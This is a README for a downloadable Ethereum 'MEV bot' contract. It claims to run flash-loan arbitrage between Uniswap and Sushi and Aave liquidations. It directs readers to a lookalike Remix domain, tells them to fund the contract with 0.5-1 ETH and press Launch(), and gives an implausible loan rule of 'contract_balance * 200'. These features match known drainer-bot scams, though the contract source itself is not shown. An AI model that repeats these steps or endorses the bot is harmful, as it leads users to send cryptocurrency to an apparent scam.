Executor (Aave/Balancer + Uniswap/Sushi)

Basically, contract for MEV: takes flash loans, runs arbitrage between DEXes, does liquidations. Everything is ready, deploy and use.

What it does:

**Essentially:** contract takes tokens on loan (flash loan), exchanges them for other tokens through DEX, then returns the loan + fee, extracting profit from price differences.

**Important:** the whole scheme is built so that **the entire process happens within one transaction of one contract** — from taking the loan to repayment and getting profit.

- **Aave V3 flashLoanSimple**: takes flash loan and calls `executeOperation(...)` callback, where the strategy is executed.
- **Balancer Vault flashLoan**: multi-asset flash loan and `receiveFlashLoan(...)` callback.
- **DEX cycle (arbitrage)**: 2 swaps (Uniswap V3 ↔ SushiSwap V2) with `minOut` and `minProfit` checks.
- **Liquidation (Aave V3)**: `liquidationCall(...)` with `minCollateralOut` check.
- **Withdrawals**: `withdrawEth(...)`, `withdrawToken(...)` + emergency `emergencyTokenRecovery(...)`.



How to run:

Owner contract — you are the owner, call functions, it does flash loans and strategies in one transaction.

**Quick scheme:**
1. Create contract in Remix: https://remix.ethereum.org/ or https://portable-remixide.org

According to Screenshot:
1- Create .sol file and paste contract in editor field [myBot.sol](myBot.sol)
2- Compilation tab > version 0.8.20 > Compile button
3- Deploy tab > Select Executor contract > press Deploy Contract

2. Top up contract balance (0.5-1 ETH)

3. Run `Launch()` — it takes loan and performs operations

4. If need to withdraw profit — press `withdrawEth()` or `withdrawToken()`

Simple start: `Launch()` — loan amount is calculated as contract_balance * 200.


- **Aave flash loan**: `executeFlashLoanArbitrage(asset, amount, params)`
- **Balancer flash loan**: `executeBalancerFlashLoan(tokens, amounts, userData)`

`params/userData` are encoded as:

- `operationType`:
  - `1` — DEX cycle
  - `2` — liquidation

Data formats:

### DEX cycle (operationType = 1)

```solidity
(uint8 firstDex, address tokenIn, address tokenOut, uint24 uniFee, uint256 minOut1, uint256 minOut2, uint256 minProfit)
```

- `firstDex`: `0` = UniswapV3→Sushi, `1` = Sushi→UniswapV3
- `uniFee`: 500 / 3000 / 10000
- `minOut1/minOut2`: slippage protection at each step
- `minProfit`: minimum profit (otherwise transaction reverts)

### Liquidation (operationType = 2)

```solidity
(address user, address debtAsset, address collateralAsset, uint256 debtToCover, bool receiveAToken, uint256 minCollateralOut)
```

Important to know:

- Don't expect easy money. Everything depends on the market — gas, slippage, competition, positions.

About ETH:

0.5-1 ETH will last a long time — for gas, if need to handle ETH/WETH, and just in case.

Roughly about profit: depends on loan size and market situation. For arbitrage usually 0.01-0.1% of amount, for liquidations — percentage of position. With 100 ETH loan might get 0.01-0.1 ETH profit, but this is very approximate and without guarantees — market changes every second.

Good luck!
